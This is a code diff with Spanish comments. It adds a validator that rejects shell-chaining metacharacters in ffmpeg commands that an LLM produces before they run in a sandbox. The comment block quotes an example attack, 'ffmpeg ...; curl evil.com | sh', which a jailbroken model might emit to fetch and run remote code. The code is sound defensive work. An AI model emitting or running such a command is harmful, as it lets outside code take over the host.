@@ -30,11 +30,79 @@ export async function detectarSilencios(
   return silencios.filter((s) => s.end > s.start);
 }
 
+/**
+ * Valida que un comando shell sea "seguro" para ejecutar en el sandbox.
+ *
+ * Antes ejecutábamos cualquier string que Claude (o cualquier otro caller)
+ * pusiera en `ffmpegCommands` sin filtrar — un LLM jailbreakeado podía emitir
+ * `ffmpeg ...; curl evil.com | sh` y se ejecutaba como shell command.
+ *
+ * Reglas:
+ *  - Debe empezar con `ffmpeg` o `printf "%s\\n"` (este último se usa en
+ *    multiclip-utils para generar el concat list — caso conocido y acotado).
+ *  - No puede contener metacaracteres de shell que rompan el "un solo
+ *    comando": `;`, `&&`, `||`, `|`, `$(`, backticks, `>`, `<`, `&`, newlines.
+ *    El único redirect que permitimos es el `>` literal de printf > file,
+ *    que validamos por la forma del prefijo printf.
+ *  - Longitud razonable (< 20 KB) para evitar abuse.
+ *
+ * Lanza con mensaje claro si algo no cuadra. No intenta "sanitizar" — el
+ * pipeline debería fallar rápido si la IA devuelve algo raro.
+ */
+export function validateShellCommand(cmd: string): void {
+  if (typeof cmd !== "string" || cmd.length === 0) {
+    throw new Error("Comando vacío o no-string");
+  }
+  if (cmd.length > 20_000) {
+    throw new Error(`Comando demasiado largo (${cmd.length} chars)`);
+  }
+  if (/[\r\n]/.test(cmd)) {
+    throw new Error("Comando contiene saltos de línea");
+  }
+  const trimmed = cmd.trimStart();
+  const isFFmpeg = /^ffmpeg(\s|$)/.test(trimmed);
+  // Caso especial: el builder multiclip emite un `printf "%s\n" ... > file`
+  // para construir la lista de concat. Es legítimo y acotado.
+  const isPrintfConcat =
+    /^printf\s+"%s\\n"\s+("[^"]*"\s+)+>\s+"[^"]+"\s*$/.test(trimmed);
+  if (!isFFmpeg && !isPrintfConcat) {
+    throw new Error(
+      `Comando rechazado: debe empezar con "ffmpeg" o ser printf-concat. ` +
+        `Recibido: ${trimmed.slice(0, 80)}`
+    );
+  }
+  if (isFFmpeg) {
+    // Para comandos ffmpeg, prohibimos cualquier metacaracter de shell que
+    // permita encadenar otro comando. Si una URL o filename necesita esos
+    // caracteres, el comando debió construirse con shSingleQuote (las
+    // metacaracteres dentro de single quotes son literales y NO matchean
+    // este regex porque verificamos el comando completo, no el contenido
+    // entre quotes).
+    //
+    // Por simplicidad usamos un patrón conservador: rechazamos backticks,
+    // `$(`, `;`, `&&`, `||`, `|` no entrecomillados. Es overly restrictive
+    // para casos legítimos (ffmpeg con pipe a otro proceso), pero nuestro
+    // pipeline nunca los necesita.
+    const dangerous = /[;`]|\$\(|&&|\|\||(?:^|[^|])\|(?:[^|]|$)/;
+    // Tokenizamos quitando contenido entre comillas para chequear el shell.
+    const naked = cmd
+      .replace(/"(?:[^"\\]|\\.)*"/g, '""')
+      .replace(/'(?:[^'\\]|\\.)*'/g, "''");
+    if (dangerous.test(naked)) {
+      throw new Error(
+        `Comando ffmpeg contiene metacaracteres de shell prohibidos: ` +
+          naked.slice(0, 120)
+      );
+    }
+  }
+}
+
 export async function ejecutarFFmpegCommands(
   sandbox: Sandbox,
   commands: string[]
 ): Promise<void> {
   for (const cmd of commands) {
+    validateShellCommand(cmd);
     const { stderr, exitCode } = await runInSandbox(sandbox, cmd);
     if (exitCode !== 0) {
       throw new Error(`FFmpeg falló (exit ${exitCode}): ${stderr.slice(-500)}`);
